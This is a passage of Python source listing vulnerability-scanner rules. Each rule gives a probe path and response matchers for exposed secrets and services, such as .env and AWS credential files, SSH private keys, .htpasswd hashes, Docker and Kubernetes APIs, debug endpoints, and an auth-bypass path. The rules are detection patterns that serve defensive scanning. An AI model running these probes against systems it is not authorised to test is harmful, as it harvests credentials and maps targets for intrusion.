            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["[core]", "repositoryformatversion"], "condition": "and"},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "git-head", "name": "Git HEAD Exposed", "severity": "high",
        "path": "/.git/HEAD", "matchers_condition": "and",
        "description": "Exposed .git/HEAD confirms a downloadable git repository",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "regex", "part": "body", "regex": [r"^ref:\s+refs/"]},
            {"type": "dsl", "dsl": ["content_length < 200"]},
        ],
    },
    {
        "id": "env-file", "name": "Environment File Exposed", "severity": "critical",
        "path": "/.env", "matchers_condition": "and",
        "description": "A .env file with live credentials is publicly readable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "regex", "part": "body",
             "regex": [r"(?m)^\s*(APP_KEY|APP_ENV|DB_PASSWORD|DB_HOST|DB_DATABASE|SECRET_KEY|AWS_ACCESS_KEY_ID|MAIL_HOST|REDIS_HOST)\s*="]},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "ds-store", "name": ".DS_Store Exposed", "severity": "medium",
        "path": "/.DS_Store", "matchers_condition": "and",
        "description": "macOS .DS_Store leaks the directory listing of the web root",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["Bud1"]},
        ],
    },
    {
        "id": "phpinfo", "name": "phpinfo() Exposed", "severity": "high",
        "path": "/phpinfo.php", "matchers_condition": "and",
        "description": "phpinfo() discloses full PHP configuration, paths and environment",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["phpinfo()", "PHP Version", "Configuration File"], "condition": "and"},
        ],
    },
    {
        "id": "laravel-debug", "name": "Laravel Debug Mode / Ignition", "severity": "critical",
        "path": "/_ignition/health-check", "matchers_condition": "and",
        "description": "Laravel Ignition debug endpoint reachable (RCE vector in CVE-2021-3129)",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["\"can_execute_commands\"", "ignition"], "condition": "or"},
            {"type": "word", "part": "header", "words": ["application/json"]},
        ],
    },
    {
        "id": "wp-config-bak", "name": "WordPress Config Backup Exposed", "severity": "critical",
        "path": "/wp-config.php.bak", "matchers_condition": "and",
        "description": "wp-config backup exposes database credentials and auth salts",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["DB_NAME", "DB_PASSWORD"], "condition": "and"},
        ],
    },
    {
        "id": "spring-actuator-env", "name": "Spring Actuator /env Exposed", "severity": "critical",
        "path": "/actuator/env", "matchers_condition": "and",
        "description": "Spring Boot Actuator env endpoint leaks configuration and secrets",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["propertySources", "systemEnvironment", "applicationConfig"], "condition": "or"},
            {"type": "word", "part": "header", "words": ["json"]},
        ],
    },
    {
        "id": "spring-heapdump", "name": "Spring Actuator Heap Dump", "severity": "critical",
        "path": "/actuator/heapdump", "matchers_condition": "and",
        "description": "Heap dump download exposes in-memory credentials and tokens",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "header",
             "words": ["application/octet-stream", "application/vnd"], "condition": "or"},
            {"type": "dsl", "dsl": ["content_length > 100000"]},
        ],
    },
    {
        "id": "swagger-spec", "name": "Swagger/OpenAPI Spec Exposed", "severity": "medium",
        "path": "/swagger.json", "matchers_condition": "and",
        "description": "API specification publicly readable — maps the full API surface",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["\"swagger\"", "\"openapi\""], "condition": "or"},
            {"type": "word", "part": "body", "words": ["\"paths\""]},
        ],
    },
    {
        "id": "jenkins-panel", "name": "Jenkins Dashboard Exposed", "severity": "high",
        "path": "/", "matchers_condition": "and",
        "description": "Jenkins instance reachable — check for anonymous read/build access",
        "matchers": [
            {"type": "status", "status": [200, 403]},
            {"type": "word", "part": "all", "words": ["X-Jenkins", "Dashboard [Jenkins]", "jenkins-session"], "condition": "or"},
        ],
    },
    {
        "id": "kibana-panel", "name": "Kibana Dashboard Exposed", "severity": "high",
        "path": "/app/kibana", "matchers_condition": "and",
        "description": "Kibana UI reachable without authentication",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "all", "words": ["kbn-name", "kibana-body", "\"kibana\""], "condition": "or"},
        ],
    },
    {
        "id": "elasticsearch", "name": "Elasticsearch Exposed", "severity": "critical",
        "path": "/_cluster/health", "matchers_condition": "and",
        "description": "Elasticsearch cluster API reachable without authentication",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["cluster_name", "number_of_nodes", "active_shards"], "condition": "and"},
        ],
    },
    {
        "id": "prometheus-metrics", "name": "Prometheus Metrics Exposed", "severity": "medium",
        "path": "/metrics", "matchers_condition": "and",
        "description": "Prometheus metrics leak internal service and host details",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "regex", "part": "body", "regex": [r"(?m)^# (HELP|TYPE) "]},
        ],
    },
    {
        "id": "phpmyadmin", "name": "phpMyAdmin Exposed", "severity": "high",
        "path": "/phpmyadmin/", "matchers_condition": "and",
        "description": "phpMyAdmin login reachable — database management interface",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "all",
             "words": ["phpmyadmin", "pma_username", "phpMyAdmin"], "condition": "or"},
            {"type": "word", "part": "body", "words": ["<html", "<form"], "condition": "or"},
        ],
    },
    {
        "id": "adminer", "name": "Adminer Exposed", "severity": "high",
        "path": "/adminer.php", "matchers_condition": "and",
        "description": "Adminer database client reachable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["Adminer", "adminer.org"], "condition": "or"},
            {"type": "word", "part": "body", "words": ["login", "server"], "condition": "or"},
        ],
    },
    {
        "id": "docker-api", "name": "Docker Remote API Exposed", "severity": "critical",
        "path": "/version", "matchers_condition": "and",
        "description": "Docker Engine API reachable — full container control",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["ApiVersion", "GitCommit", "GoVersion"], "condition": "and"},
        ],
    },
    {
        "id": "kubernetes-api", "name": "Kubernetes API Exposed", "severity": "critical",
        "path": "/api/v1/namespaces", "matchers_condition": "and",
        "description": "Kubernetes API reachable — cluster enumeration possible",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["\"kind\"", "NamespaceList"], "condition": "and"},
        ],
    },
    {
        "id": "traefik-dashboard", "name": "Traefik Dashboard Exposed", "severity": "high",
        "path": "/dashboard/", "matchers_condition": "and",
        "description": "Traefik routing dashboard reachable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["traefik", "Traefik"], "condition": "or"},
        ],
    },
    {
        "id": "grafana-panel", "name": "Grafana Login Exposed", "severity": "medium",
        "path": "/login", "matchers_condition": "and",
        "description": "Grafana reachable — check for default credentials",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "all", "words": ["grafana", "Grafana"], "condition": "or"},
            {"type": "word", "part": "body", "words": ["grafana-app", "grafanaBootData", "loginForm"], "condition": "or"},
        ],
    },
    {
        "id": "rabbitmq-mgmt", "name": "RabbitMQ Management Exposed", "severity": "high",
        "path": "/api/overview", "matchers_condition": "and",
        "description": "RabbitMQ management API reachable",
        "matchers": [
            {"type": "status", "status": [200, 401]},
            {"type": "word", "part": "all", "words": ["RabbitMQ", "rabbit_version", "management"], "condition": "or"},
        ],
    },
    {
        "id": "sql-dump", "name": "SQL Dump Exposed", "severity": "critical",
        "path": "/dump.sql", "matchers_condition": "and",
        "description": "A database dump is publicly downloadable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["CREATE TABLE", "INSERT INTO", "DROP TABLE", "-- MySQL dump"], "condition": "or"},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "htpasswd", "name": ".htpasswd Exposed", "severity": "critical",
        "path": "/.htpasswd", "matchers_condition": "and",
        "description": "HTTP basic-auth password hashes are publicly readable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "regex", "part": "body", "regex": [r"(?m)^[\w.\-]+:(\$apr1\$|\$2[aby]\$|\{SHA\}|\$1\$)"]},
        ],
    },
    {
        "id": "npm-token", "name": ".npmrc Token Exposed", "severity": "critical",
        "path": "/.npmrc", "matchers_condition": "and",
        "description": "npm registry auth token is publicly readable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["_authToken", "//registry.npmjs.org/"], "condition": "or"},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "aws-credentials", "name": "AWS Credentials File Exposed", "severity": "critical",
        "path": "/.aws/credentials", "matchers_condition": "and",
        "description": "AWS credentials file is publicly readable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body",
             "words": ["aws_access_key_id", "aws_secret_access_key"], "condition": "or"},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "ssh-private-key", "name": "SSH Private Key Exposed", "severity": "critical",
        "path": "/id_rsa", "matchers_condition": "and",
        "description": "An SSH private key is publicly downloadable",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["-----BEGIN", "PRIVATE KEY-----"], "condition": "and"},
        ],
    },
    {
        "id": "docker-compose", "name": "docker-compose.yml Exposed", "severity": "high",
        "path": "/docker-compose.yml", "matchers_condition": "and",
        "description": "Compose file exposes services, ports and often credentials",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["services:", "image:"], "condition": "and"},
            {"type": "dsl", "dsl": ["not_html"]},
        ],
    },
    {
        "id": "graphql-introspection", "name": "GraphQL Introspection Enabled", "severity": "medium",
        "path": "/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D",
        "matchers_condition": "and",
        "description": "GraphQL introspection reveals the full schema",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["__schema", "queryType"], "condition": "and"},
            {"type": "word", "part": "header", "words": ["json"]},
        ],
    },
    {
        "id": "sonarqube", "name": "SonarQube Exposed", "severity": "medium",
        "path": "/api/system/status", "matchers_condition": "and",
        "description": "SonarQube system status reachable without auth",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["\"status\"", "\"version\""], "condition": "and"},
            {"type": "word", "part": "body", "words": ["UP", "STARTING", "DOWN"], "condition": "or"},
        ],
    },
    {
        "id": "wp-user-enum", "name": "WordPress User Enumeration", "severity": "medium",
        "path": "/wp-json/wp/v2/users", "matchers_condition": "and",
        "description": "WordPress REST API exposes usernames and slugs",
        "matchers": [
            {"type": "status", "status": [200]},
            {"type": "word", "part": "body", "words": ["\"slug\"", "\"id\""], "condition": "and"},
            {"type": "word", "part": "header", "words": ["json"]},
        ],
    },
]



# ── Extended playbook: rules ported from the official nuclei-templates repo ──
# Generated from projectdiscovery/nuclei-templates (GET-only templates carrying real
# word-matcher evidence — regex matchers are deliberately not ported, see gen_rules.py).
# Every rule was then replayed against decoy responses — soft-404, WAF 403, marketing
# homepage, SPA shell, empty 200, JSON error, redirect and a generic login page — and
# any rule that fired on a decoy was discarded.
VULN_RULES_EXTENDED = [
    {
        "id": 'axiom-digitalocean-key-exposure', "name": 'DigitalOcean Key Exposure via Axiom',
        "severity": 'critical', "path": '/.axiom/accounts/do.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'DigitalOcean Key Exposure via Axiom (ported from nuclei template http/exposures/tokens/digitalocean/axiom-digitalocean-key-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"do_key"', '"region"', '"provider"'], 'condition': 'or'}],
    },
    {
        "id": 'tugboat-config-exposure', "name": 'Tugboat Configuration File Exposure',
        "severity": 'critical', "path": '/.tugboat',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Tugboat Configuration File Exposure (ported from nuclei template http/exposures/tokens/digitalocean/tugboat-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['authentication', 'access_token', 'ssh_user'], 'condition': 'or'}],
    },
    {
        "id": 'bitbucket-auth-bypass', "name": 'Bitbucket Server > 4.8 - Authentication Bypass',
        "severity": 'critical', "path": '/admin%20/db',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Bitbucket Server > 4.8 - Authentication Bypass (ported from nuclei template http/misconfiguration/bitbucket-auth-bypass.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<h2>Database</h2>', 'Migrate database'], 'condition': 'or'}],
    },
    {
        "id": 'getsimple-installation', "name": 'GetSimple CMS - Installer',
        "severity": 'critical', "path": '/admin/install.php',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'GetSimple CMS - Installer (ported from nuclei template http/misconfiguration/installer/getsimple-installation.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>GetSimple &raquo; Installation</title>', 'PHP Version'], 'condition': 'or'}],
    },
    {
        "id": 'aem-groovyconsole', "name": 'AEM Groovy Console Discovery',
        "severity": 'critical', "path": '/groovyconsole',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AEM Groovy Console Discovery (ported from nuclei template http/misconfiguration/aem/aem-groovyconsole.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Groovy Console</title>', 'Run Script', 'Groovy Web Console'], 'condition': 'or'}],
    },
    {
        "id": 'circarlife-installer', "name": 'CirCarLife - Installer',
        "severity": 'critical', "path": '/html/setup.html',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'CirCarLife - Installer (ported from nuclei template http/misconfiguration/installer/circarlife-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['CirCarLife Scada', '<title>- setup</title>', 'Network setup', 'Modem setup', 'Security setup'], 'condition': 'or'}],
    },
    {
        "id": 'misconfigured-docker', "name": 'Docker Container - Misconfiguration Exposure',
        "severity": 'critical', "path": '/images/json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Docker Container - Misconfiguration Exposure (ported from nuclei template http/misconfiguration/misconfigured-docker.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"ParentId":', '"Containers":', '"Labels":'], 'condition': 'or'}],
    },
    {
        "id": 'jupyter-ipython-unauth', "name": 'Jupyter ipython - Authorization Bypass',
        "severity": 'critical', "path": '/ipython/tree',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jupyter ipython - Authorization Bypass (ported from nuclei template http/misconfiguration/jupyter-ipython-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ipython/static/components', 'ipython/kernelspecs'], 'condition': 'or'}],
    },
    {
        "id": 'zipline-installer', "name": 'Zipline - Installer',
        "severity": 'critical', "path": '/setup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Zipline - Installer (ported from nuclei template http/misconfiguration/installer/zipline-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Setup Zipline', 'Configuration', 'Create a super-admin account'], 'condition': 'or'}],
    },
    {
        "id": 'wp-install', "name": 'WordPress Exposed Installation',
        "severity": 'critical', "path": '/wp-admin/install.php?step=1',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'WordPress Exposed Installation (ported from nuclei template http/misconfiguration/installer/wp-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>WordPress &rsaquo; Installation</title>', 'Site Title'], 'condition': 'or'}],
    },
    {
        "id": 'asus-rtn16-default-login', "name": 'ASUS RT-N16 - Default Login',
        "severity": 'high', "path": '/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ASUS RT-N16 - Default Login (ported from nuclei template http/default-logins/asus/asus-rtn16-default-login.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ASUS', 'RT-N16', 'System Status', 'Network Map'], 'condition': 'or'}],
    },
    {
        "id": 'wpconfig-aws-keys', "name": 'AWS S3 keys Leak',
        "severity": 'high', "path": '/%c0',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'AWS S3 keys Leak (ported from nuclei template http/exposures/configs/wpconfig-aws-keys.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['access-key-id', 'secret-access-key', 'DB_NAME', 'DB_PASSWORD'], 'condition': 'or'}],
    },
    {
        "id": 'dockercfg-config', "name": 'Detect .dockercfg',
        "severity": 'high', "path": '/.dockercfg',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Detect .dockercfg (ported from nuclei template http/exposures/configs/dockercfg-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"email":', '"auth":'], 'condition': 'or'}],
    },
    {
        "id": 'detect-drone-config', "name": 'Drone - Configuration Detection',
        "severity": 'high', "path": '/.drone.yml',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Drone - Configuration Detection (ported from nuclei template http/exposures/configs/detect-drone-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['kind:'], 'condition': 'or'}],
    },
    {
        "id": 'esmtprc-config', "name": 'eSMTP - Config Discovery',
        "severity": 'high', "path": '/.esmtprc',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'eSMTP - Config Discovery (ported from nuclei template http/exposures/configs/esmtprc-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['hostname'], 'condition': 'or'}],
    },
    {
        "id": 'ftpconfig', "name": 'Atom remote-ssh ftpconfig Exposure',
        "severity": 'high', "path": '/.ftpconfig',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Atom remote-ssh ftpconfig Exposure (ported from nuclei template http/exposures/files/ftpconfig.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"protocol":', '"host":', '"user":', '"passphrase":'], 'condition': 'or'}],
    },
    {
        "id": 'htpasswd-detection', "name": 'Apache htpasswd Config - Detect',
        "severity": 'high', "path": '/.htpasswd',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Apache htpasswd Config - Detect (ported from nuclei template http/exposures/configs/htpasswd-detection.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': [':{SHA}', ':$apr1$', ':$2y$'], 'condition': 'or'}],
    },
    {
        "id": 'mysql-config-exposure', "name": 'MySQL Conifg - Exposure',
        "severity": 'high', "path": '/.my.cnf',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'MySQL Conifg - Exposure (ported from nuclei template http/exposures/configs/mysql-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['[client]'], 'condition': 'or'}],
    },
    {
        "id": 'atom-sync-remote', "name": 'Atom Synchronization Exposure',
        "severity": 'high', "path": '/.remote-sync.json',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Atom Synchronization Exposure (ported from nuclei template http/exposures/files/atom-sync-remote.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"hostname":', '"username":', 'passphrase'], 'condition': 'or'}],
    },
    {
        "id": 's3cfg-config', "name": 'S3CFG Configuration - Detect',
        "severity": 'high', "path": '/.s3cfg',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'S3CFG Configuration - Detect (ported from nuclei template http/exposures/configs/s3cfg-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['access_key', 'bucket_location', 'secret_key'], 'condition': 'or'}],
    },
    {
        "id": 'rack-mini-profiler', "name": 'rack-mini-profiler - Environment Information Disclosure',
        "severity": 'high', "path": '/?pp=env',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'rack-mini-profiler - Environment Information Disclosure (ported from nuclei template http/misconfiguration/rack-mini-profiler.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Rack Environment'], 'condition': 'or'}],
    },
    {
        "id": 'clickhouse-unauth-api', "name": 'ClickHouse API Database Interface - Improper Authorization',
        "severity": 'high', "path": '/?query=SHOW%20DATABASES',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ClickHouse API Database Interface - Improper Authorization (ported from nuclei template http/misconfiguration/clickhouse-unauth-api.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['default', 'system', 'text/tab-separated-values'], 'condition': 'or'}],
    },
    {
        "id": 'manage-engine-ad-search', "name": 'Manage Engine AD Search',
        "severity": 'high', "path": '/ADSearch.cc?methodToCall=search',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Manage Engine AD Search (ported from nuclei template http/misconfiguration/manage-engine-ad-search.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['ManageEngine', 'Showing Objects Of', 'Export as', 'This search has been disabled'], 'condition': 'or'}],
    },
    {
        "id": 'unauthenticated-lansweeper', "name": 'Unauthenticated Lansweeper Instance',
        "severity": 'high', "path": '/Default.aspx',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Unauthenticated Lansweeper Instance (ported from nuclei template http/misconfiguration/unauthenticated-lansweeper.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Main page - Lansweeper'], 'condition': 'or'}],
    },
    {
        "id": 'brickcom-camera-unauth-snapshot', "name": 'Brickcom Camera - Unauthenticated Snapshot Access',
        "severity": 'high', "path": '/ONVIF/media.cgi?action=getSnapshot',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Brickcom Camera - Unauthenticated Snapshot Access (ported from nuclei template http/misconfiguration/brickcom-camera-unauth-snapshot.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['image/jpeg'], 'condition': 'or'}],
    },
    {
        "id": 'simatic-dashboard-exposed', "name": 'Siemens SIMATIC 300 Dashboard - Exposed',
        "severity": 'high', "path": '/Portal0000.htm',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Siemens SIMATIC 300 Dashboard - Exposed (ported from nuclei template http/misconfiguration/simatic-dashboard-exposed.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['alt="Simatic S7 CP"'], 'condition': 'or'}],
    },
    {
        "id": 'rexify-config-exposure', "name": 'Rexify Configuration - Exposure',
        "severity": 'high', "path": '/Rexfile',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Rexify Configuration - Exposure (ported from nuclei template http/exposures/configs/rexify-config-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['use Rex', 'task', 'group', 'desc'], 'condition': 'or'}],
    },
    {
        "id": 'unauthorized-hp-printer', "name": 'Unauthorized HP Printer',
        "severity": 'high', "path": '/SSI/Auth/ip_snmp.htm',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Unauthorized HP Printer (ported from nuclei template http/misconfiguration/hp/unauthorized-hp-printer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<h1>SNMP</h1>'], 'condition': 'or'}],
    },
    {
        "id": 'connectwise-setup', "name": 'ConnectWise Setup Wizard - Exposure',
        "severity": 'high', "path": '/SetupWizard.aspx',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'ConnectWise Setup Wizard - Exposure (ported from nuclei template http/misconfiguration/installer/connectwise-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['SetupWizardPage', 'ContentPanel SetupWizard'], 'condition': 'or'}],
    },
    {
        "id": 'jackett-unauth', "name": 'Jackett UI - Unauthenticated',
        "severity": 'high', "path": '/UI/Dashboard',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Jackett UI - Unauthenticated (ported from nuclei template http/misconfiguration/jackett-unauth.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Jackett', 'API Key:'], 'condition': 'or'}],
    },
    {
        "id": 'onlyoffice-installer', "name": 'OnlyOffice Wizard Page - Exposure',
        "severity": 'high', "path": '/Wizard.aspx',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'OnlyOffice Wizard Page - Exposure (ported from nuclei template http/misconfiguration/installer/onlyoffice-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Portal Setup', 'onlyoffice'], 'condition': 'or'}],
    },
    {
        "id": 'clockwork-dashboard-exposure', "name": 'Clockwork Dashboard Exposure',
        "severity": 'high', "path": '/__clockwork/latest',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Clockwork Dashboard Exposure (ported from nuclei template http/misconfiguration/clockwork-dashboard-exposure.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"id":', '"version":', '"method":', '"url":', '"time":'], 'condition': 'or'}],
    },
    {
        "id": 'symfony-profiler', "name": 'Symfony Profiler - Detect',
        "severity": 'high', "path": '/_profiler/empty/search/results?limit=10',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Symfony Profiler - Detect (ported from nuclei template http/exposures/configs/symfony-profiler.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Symfony Profiler', '<title>Profiler</title>', 'Symfony-Debug-Toolbar'], 'condition': 'or'}],
    },
    {
        "id": 'service-pwd', "name": 'service.pwd - Sensitive Information Disclosure',
        "severity": 'high', "path": '/_vti_pvt/service.pwd',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'service.pwd - Sensitive Information Disclosure (ported from nuclei template http/misconfiguration/service-pwd.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['# -FrontPage-'], 'condition': 'or'}],
    },
    {
        "id": 'secnet-info-leak', "name": 'Secnet Intelligent Routing System actpt_5g.data - Information Leak',
        "severity": 'high', "path": '/actpt_5g.data',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Secnet Intelligent Routing System actpt_5g.data - Information Leak (ported from nuclei template http/misconfiguration/secnet-info-leak.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['"http_username":', '"http_passwd":'], 'condition': 'or'}],
    },
    {
        "id": 'administrate-dashboard', "name": 'Administrate Dashboard Exposure',
        "severity": 'high', "path": '/admin',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Administrate Dashboard Exposure (ported from nuclei template http/misconfiguration/administrate-dashboard.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Search Customers', 'Administrate', 'New customer</a>'], 'condition': 'or'}],
    },
    {
        "id": 'unauthenticated-airflow-instance', "name": 'Unauthenticated Airflow Instance',
        "severity": 'high', "path": '/admin/',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Unauthenticated Airflow Instance (ported from nuclei template http/misconfiguration/airflow/unauthenticated-airflow.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Airflow - DAGs</title>'], 'condition': 'or'}],
    },
    {
        "id": 'poste-io-installer', "name": 'Poste.io - Installer',
        "severity": 'high', "path": '/admin/install/server',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Poste.io - Installer (ported from nuclei template http/misconfiguration/installer/poste-io-installer.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['Initial server configuration', 'poste'], 'condition': 'or'}],
    },
    {
        "id": 'filestash-admin-config', "name": 'Filestash Admin Password Configuration',
        "severity": 'high', "path": '/admin/setup',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Filestash Admin Password Configuration (ported from nuclei template http/exposures/configs/filestash-admin-config.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Admin Console</title>', 'component-loader'], 'condition': 'or'}],
    },
    {
        "id": 'fusionauth-admin-setup', "name": 'FusionAuth Exposed Admin Setup',
        "severity": 'high', "path": '/admin/setup-wizard',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'FusionAuth Exposed Admin Setup (ported from nuclei template http/misconfiguration/fusionauth-admin-setup.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>FusionAuth Setup Wizard', 'FusionAuth is now installed and running'], 'condition': 'or'}],
    },
    {
        "id": 'ruckus-unleashed-install', "name": 'Ruckus Unleashed Exposed Installation',
        "severity": 'high', "path": '/admin/wizard.jsp',
        "matchers_condition": "and", "origin": "nuclei",
        "description": 'Ruckus Unleashed Exposed Installation (ported from nuclei template http/misconfiguration/installer/ruckus-unleashed-install.yaml)',
        "matchers": [{'type': 'status', 'status': [200]}, {'type': 'word', 'part': 'all', 'words': ['<title>Setup Wizard', '/ruckus'], 'condition': 'or'}],
    },
    {
        "id": 'symfony-debug', "name": 'Symfony Debug Mode',
